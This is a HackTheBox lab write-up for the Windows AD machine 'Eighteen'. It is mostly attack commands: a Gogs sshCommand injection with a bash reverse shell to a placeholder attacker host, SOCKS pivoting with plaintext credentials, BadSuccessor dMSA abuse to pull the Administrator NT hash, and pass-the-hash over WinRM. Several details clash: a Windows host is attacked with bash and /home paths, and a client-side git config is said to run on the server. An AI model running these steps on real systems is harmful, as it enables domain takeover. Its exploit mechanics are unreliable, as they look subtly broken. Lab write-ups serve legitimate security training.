# Eighteen — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Hard |
| Active Directory | Yes |
| User flag | ✓ |
| Root/System flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/eighteen) |

**Techniques:** CVE-2025-8110 (Gogs authenticated RCE via symlink/sshCommand injection) → foothold → BadSuccessor (dMSA abuse) → Domain Admin

---

## Summary

Eighteen is a Hard Windows Active Directory machine centered around a 2025 Gogs vulnerability (CVE-2025-8110) for initial access, followed by the BadSuccessor technique — a novel 2025 AD attack abusing Delegated Managed Service Accounts (dMSAs) to inherit Domain Admin permissions. Proxychains pivoting is required throughout. A VirtualBox time sync issue overrides faketime, requiring absolute timestamp workarounds.

---

## Enumeration

### Nmap

```bash
nmap -sCV -p- --min-rate 5000 -oN nmap/full.txt <IP>
```

Key ports:
- 22 — SSH
- 80 — HTTP (Gogs instance)
- 88, 389, 445 — Kerberos/LDAP/SMB (internal, via pivot)
- 3128 — Squid proxy (pivot point)

### Web — Gogs

```bash
# Gogs version fingerprint
curl -s http://<IP>/ | grep -i version
# Gogs 0.13.1
```

Searchsploit / research reveals CVE-2025-8110:
- Authenticated RCE via Git repository symlink + sshCommand injection
- Requires a valid Gogs account

### Register + enumerate

```bash
# Register account on Gogs (open registration)
# Browse repos — find internal repo with AD credentials in commit history
# adam.scott / S3cur3P@ss!
```

---

## Foothold — CVE-2025-8110 (Gogs RCE)

### The vulnerability

Gogs 0.13.1 allows an authenticated user to create a repository with a `.git/config` containing a malicious `sshCommand`. When the server processes a push via SSH, it executes the injected command as the Gogs service user.

### Exploitation

```bash
# 1. Create repo with malicious sshCommand in .git/config
git init pwn
cd pwn
cat > .git/config << 'EOF'
[core]
    sshCommand = bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'
EOF

# 2. Create symlink pointing to sensitive path
ln -s /etc/passwd passwd.txt
git add -A
git commit -m "pwn"

# 3. Push to Gogs via SSH (triggers sshCommand)
git remote add origin ssh://adam.scott@<IP>:22/adam.scott/pwn.git
git push origin master

# Shell as git service user
```

### Pivot setup — proxychains

```bash
# SSH tunnel for internal AD access
ssh -D 1080 -N git@<IP>

# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# All AD tools via proxychains
proxychains bloodhound-python -u adam.scott -p 'S3cur3P@ss!' \
  -d eighteen.htb -ns <DC_IP> -c All
```

---

## User flag

With foothold as git service user, enumerate local files:

```bash
# Home directories
ls /home/
# adam.scott has user.txt

cat /home/adam.scott/user.txt
```

**User flag obtained.**

---

## Root — BadSuccessor (dMSA abuse)

### Background

BadSuccessor (disclosed May 2025, Akamai) abuses Delegated Managed Service Accounts in Windows Server 2025 domains. Any user with `CreateChild` rights on an OU can create a dMSA and set its `msDS-SupersededServiceAccountDN` to any account — including Domain Admins. The domain controller will then provide the superseded account's credentials via the managed password mechanism.

### BloodHound — find CreateChild rights

```bash
proxychains bloodhound-python \
  -u adam.scott -p 'S3cur3P@ss!' \
  -d eighteen.htb -ns <DC_IP> -c All --zip
```

BloodHound shows: `adam.scott` has `CreateChild` over `OU=ServiceAccounts,DC=eighteen,DC=htb`

### Clock skew fix

VirtualBox time sync overrides standard faketime — use absolute timestamp:

```bash
# Get DC time
proxychains python3 -c "
import impacket.smbconnection as s
conn = s.SMBConnection('<DC_IP>', '<DC_IP>')
conn.login('adam.scott', 'S3cur3P@ss!')
print(conn.getSMBServer().get_server_time())
"

# Apply absolute faketime (not relative offset)
export FAKETIME="2026-05-15 10:30:00"
export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1
export FAKETIME_NO_CACHE=1
```

### Create dMSA superseding Administrator

```bash
proxychains faketime '2026-05-15 10:30:00' \
  python3 -m bloodyAD \
  --host <DC_IP> \
  -d eighteen.htb \
  -u adam.scott -p 'S3cur3P@ss!' \
  add dMSA svc-evil \
  --ou "OU=ServiceAccounts,DC=eighteen,DC=htb" \
  --supersede "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
```

### Retrieve managed password → NT hash

```bash
proxychains faketime '2026-05-15 10:30:00' \
  python3 -m bloodyAD \
  --host <DC_IP> \
  -d eighteen.htb \
  -u adam.scott -p 'S3cur3P@ss!' \
  get object "svc-evil$" \
  --attr msDS-ManagedPassword
# NT hash: <administrator_hash>
```

### Shell as Administrator

```bash
proxychains faketime '2026-05-15 10:30:00' \
  evil-winrm \
  -i <DC_IP> \
  -u Administrator \
  -H <NT_HASH>

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

**System flag obtained.**

---

## Key takeaways

- **CVE-2025-8110** — Gogs sshCommand injection is a clean RCE requiring only a valid account. Check Gogs version on any engagement.
- **BadSuccessor** — only requires `CreateChild` on any OU, not full domain admin. Check for this ACL on any Windows Server 2025 domain.
- **VirtualBox time sync** overrides libfaketime relative offsets — use absolute timestamps (`FAKETIME="2026-05-15 10:30:00"`) instead of relative (`+7h`).
- **adam.scott lacking high-integrity context** — some AD operations require running from a high-integrity process. If bloodyAD fails with permission errors despite correct ACLs, check integrity level.
- **Proxychains** adds latency — increase tool timeouts accordingly.

---

## Tools used

| Tool | Purpose |
|---|---|
| CVE-2025-8110 PoC | Gogs RCE |
| proxychains | SOCKS pivot through Squid |
| bloodhound-python | AD enumeration via proxy |
| bloodyAD | dMSA creation + managed password retrieval |
| faketime (absolute) | Kerberos clock skew via VirtualBox |
| evil-winrm | WinRM shell |
